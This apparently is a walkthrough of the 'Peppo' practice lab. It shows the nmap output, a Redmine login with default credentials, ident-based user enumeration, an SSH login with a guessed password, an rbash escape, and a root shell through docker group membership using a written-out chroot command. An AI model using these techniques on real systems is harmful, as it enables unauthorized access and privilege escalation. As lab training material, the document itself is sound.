---
title: Peppo  PGP walkthrough
description: Target - Peppo, OS - Linux, Difficulty - Hard
readTime: 10 min read
image: ../assets/images/peppo/rdmn.png
date: 01-02-2026
---

#### ***Enumeration***

Started off with a nmap scan and gathered information about the target  network, systems, services, open ports.

```
nmap -sVC -n -p- -T4 --open -Pn -oN Peppo-nmap 192.168.189.60

Nmap scan report for 192.168.189.60
Host is up (/1dragon/assets/images/peppo/0.35s latency).
Not shown: 65529 filtered tcp ports (/1dragon/assets/images/peppo/no-response), 1 closed tcp port (/1dragon/assets/images/peppo/reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE           VERSION
22/tcp    open  ssh               OpenSSH 7.4p1 Debian 10+deb9u7 (/1dragon/assets/images/peppo/protocol 2.0)
| ssh-hostkey: 
|   2048 75:4c:02:01:fa:1e:9f:cc:e4:7b:52:fe:ba:36:85:a9 (/1dragon/assets/images/peppo/RSA)
|   256 b7:6f:9c:2b:bf:fb:04:62:f4:18:c9:38:f4:3d:6b:2b (/1dragon/assets/images/peppo/ECDSA)
|_  256 98:7f:b6:40:ce:bb:b5:57:d5:d1:3c:65:72:74:87:c3 (/1dragon/assets/images/peppo/ED25519)
|_auth-owners: root
113/tcp   open  ident             FreeBSD identd
|_auth-owners: nobody
5432/tcp  open  postgresql        PostgreSQL DB 9.6.0 or later
8080/tcp  open  http              WEBrick httpd 1.4.2 (/1dragon/assets/images/peppo/Ruby 2.6.6 (/1dragon/assets/images/peppo/2020-03-31))
|_http-server-header: WEBrick/1.4.2 (/1dragon/assets/images/peppo/Ruby/2.6.6/2020-03-31)
|_http-title: Redmine
| http-robots.txt: 4 disallowed entries 
|_/issues/gantt /issues/calendar /activity /search
10000/tcp open  snet-sensor-mgmt?
|_auth-owners: eleanor
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   FourOhFourRequest: 
|     HTTP/1.1 200 OK
|     Content-Type: text/plain
|     Date: Sat, 03 Jan 2026 11:28:21 GMT
|     Connection: close
|     Hello World
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Content-Type: text/plain
|     Date: Sat, 03 Jan 2026 11:28:06 GMT
|     Connection: close
|     Hello World
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Content-Type: text/plain
|     Date: Sat, 03 Jan 2026 11:28:07 GMT
|     Connection: close
|_    Hello World
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port10000-TCP:V=7.95%I=7%D=1/3%Time=6958FD61%P=aarch64-unknown-linux-gn
SF:u%r(/1dragon/assets/images/peppo/GetRequest,71,"HTTP/1\.1\x20200\x20OK\r\nContent-Type:\x20text/plai
SF:n\r\nDate:\x20Sat,\x2003\x20Jan\x202026\x2011:28:06\x20GMT\r\nConnectio
SF:n:\x20close\r\n\r\nHello\x20World\n")%r(/1dragon/assets/images/peppo/HTTPOptions,71,"HTTP/1\.1\x2020
SF:0\x20OK\r\nContent-Type:\x20text/plain\r\nDate:\x20Sat,\x2003\x20Jan\x2
SF:02026\x2011:28:07\x20GMT\r\nConnection:\x20close\r\n\r\nHello\x20World\
SF:n")%r(/1dragon/assets/images/peppo/RTSPRequest,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:
SF:\x20close\r\n\r\n")%r(/1dragon/assets/images/peppo/RPCCheck,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r
SF:\nConnection:\x20close\r\n\r\n")%r(/1dragon/assets/images/peppo/DNSVersionBindReqTCP,2F,"HTTP/1\.1\x
SF:20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(/1dragon/assets/images/peppo/DNSStatusRe
SF:questTCP,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close
SF:\r\n\r\n")%r(/1dragon/assets/images/peppo/Help,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:
SF:\x20close\r\n\r\n")%r(/1dragon/assets/images/peppo/SSLSessionReq,2F,"HTTP/1\.1\x20400\x20Bad\x20Requ
SF:est\r\nConnection:\x20close\r\n\r\n")%r(/1dragon/assets/images/peppo/TerminalServerCookie,2F,"HTTP/1
SF:\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(/1dragon/assets/images/peppo/TLSSes
SF:sionReq,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\
SF:r\n\r\n")%r(/1dragon/assets/images/peppo/Kerberos,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnecti
SF:on:\x20close\r\n\r\n")%r(/1dragon/assets/images/peppo/SMBProgNeg,2F,"HTTP/1\.1\x20400\x20Bad\x20Requ
SF:est\r\nConnection:\x20close\r\n\r\n")%r(/1dragon/assets/images/peppo/X11Probe,2F,"HTTP/1\.1\x20400\x
SF:20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(/1dragon/assets/images/peppo/FourOhFourRequest,
SF:71,"HTTP/1\.1\x20200\x20OK\r\nContent-Type:\x20text/plain\r\nDate:\x20S
SF:at,\x2003\x20Jan\x202026\x2011:28:21\x20GMT\r\nConnection:\x20close\r\n
SF:\r\nHello\x20World\n")%r(/1dragon/assets/images/peppo/LPDString,2F,"HTTP/1\.1\x20400\x20Bad\x20Reque
SF:st\r\nConnection:\x20close\r\n\r\n")%r(/1dragon/assets/images/peppo/LDAPSearchReq,2F,"HTTP/1\.1\x204
SF:00\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(/1dragon/assets/images/peppo/LDAPBindReq,2F
SF:,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%
SF:r(/1dragon/assets/images/peppo/SIPOptions,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20c
SF:lose\r\n\r\n")%r(/1dragon/assets/images/peppo/LANDesk-RC,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nC
SF:onnection:\x20close\r\n\r\n")%r(/1dragon/assets/images/peppo/TerminalServer,2F,"HTTP/1\.1\x20400\x20
SF:Bad\x20Request\r\nConnection:\x20close\r\n\r\n");
Service Info: OSs: Linux, FreeBSD; CPE: cpe:/o:linux:linux_kernel, cpe:/o:freebsd:freebsd
```

Discovered a  Redmine web app  login page on port 8080 and logged in as admin with default credentials `admin:admin`

![redmine-webpage](/1dragon/assets/images/peppo/Pasted%20image%2020260103034315.png)

After the password reset prompt logged in as admin but the web app didn't gave a lead.

![chagne-pass](/1dragon/assets/images/peppo/Pasted%20image%2020260103034031.png)

Nmap scan result revealed that port 113 is open running ident service. A search about this port showed that its a outdated  legacy user identification service.

Further discovered a tool to enumerate ident service and ran the the tool with all the open ports discovered

`./ident-user-enum.pl 192.168.189.60 22, 8080, 113, 5432, 10000`

![ident-allprt](/1dragon/assets/images/peppo/Pasted%20image%2020260103040648.png)
The output from the tool showed that the port 113 user as nobody however port 10000 was run by user eleanor

---

#### ***Intial Access***

With the information discovered by the tool above and user eleanor tired to login as eleanor via ssh with name it sekf as the password `elanor:eleanor` and it worked.

After successful login as user eleanor basic commands like `whoami` ,  `id`  didn't work because of the shell in used is `r-bash` which is a restricted shell for the user.

![elnr_sh](/1dragon/assets/images/peppo/Pasted%20image%2020260103075740.png)

`echo $SHELL` and `echo $PATH` showed that the current shell is rbash and path has bin

![shell_path](/1dragon/assets/images/peppo/Pasted%20image%2020260103085359.png)

`ls bin `  showed list of available commands that can be run. In which  `ed` was used to set path 

![ed](/1dragon/assets/images/peppo/Pasted%20image%2020260103081134.png)

path was set with command `export PATH=/bin:/usr/bin`

![](/1dragon/assets/images/peppo/Pasted%20image%2020260103090811.png)

Captured local.txt under '/home/eleanor/local.txt'

![local](/1dragon/assets/images/peppo/Pasted%20image%2020260103092141.png)

---

#### ***Privilege Escalation***

Ran `id` command to see user eleanor groups. Found that the user is was also in docker group.

![ele_group](/1dragon/assets/images/peppo/Pasted%20image%2020260103091118.png)
A quick `docker ls ` commands showed that redmine  is one of the docker images.

![docker_img](/1dragon/assets/images/peppo/Pasted%20image%2020260103081625.png)

Ran  `docker run -v /:/mnt --rm -it redmine chroot /mnt sh` as shown in [docker privilege escalation ](/1dragon/assets/images/peppo/https://gtfobins.github.io/gtfobins/docker/)

Achieved shell as user root.
Captured the root user flag under '/root/proof.txt'

![root_shell](/1dragon/assets/images/peppo/Pasted%20image%2020260103074124.png)

---
										Target compromised - |^| ^ ( |< 3 D